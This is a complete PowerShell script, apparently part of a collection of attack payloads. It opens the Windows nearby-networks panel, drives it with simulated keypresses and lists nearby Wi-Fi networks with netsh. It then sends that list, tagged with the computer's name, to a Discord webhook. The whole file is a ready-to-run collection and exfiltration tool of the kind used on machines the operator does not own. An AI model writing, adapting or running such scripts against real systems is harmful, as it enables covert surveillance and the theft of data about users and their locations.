<#============================== beigeworm's nearby networks to discord ===================================

SYNOPSIS
Using powershell to open the nearby networks window, then run netsh command to enumerate the networks and finally send the info to discord.

USAGE
1. Replace YOUR_WEBHOOK_HERE with your webhook
2. Run the script and wait for results in discord.

#>

$hookurl = "YOUR_WEBHOOK_HERE"

# Nearby WiFi Networks
$showNetworks = explorer.exe ms-availablenetworks:
sleep 4
$wshell = New-Object -ComObject wscript.shell
$wshell.AppActivate('explorer.exe')
$tab = 0
while ($tab -lt 6){
$wshell.SendKeys('{TAB}')
$tab++
}
$wshell.SendKeys('{ENTER}')
$wshell.SendKeys('{TAB}')
$wshell.SendKeys('{ESC}')
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
$Wifi = ($NearbyWifi|Out-String)
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$Wifi"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

